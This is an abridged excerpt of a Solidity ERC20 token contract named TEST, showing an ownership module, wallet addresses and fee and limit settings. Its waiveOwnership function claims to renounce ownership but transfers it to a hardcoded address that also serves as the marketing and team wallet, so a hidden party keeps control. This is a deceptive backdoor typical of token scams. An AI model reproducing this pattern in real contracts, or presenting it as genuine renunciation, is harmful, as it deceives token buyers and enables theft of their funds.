...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xd726fC1Ca529ECbD1318d7C9EB89744De460472b));
        _owner = address(0xd726fC1Ca529ECbD1318d7C9EB89744De460472b);
    }
...
contract TEST is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xd726fC1Ca529ECbD1318d7C9EB89744De460472b);
    address payable public teamWalletAddress = payable(0xd726fC1Ca529ECbD1318d7C9EB89744De460472b);
   ...
   uint256 public _buyLiquidityFee = 2;
    ...
    uint256 public _maxTxAmount =   80000000000000 * 10**_decimals;     
    uint256 public _walletMax =     80000000000000 * 10**_decimals;      
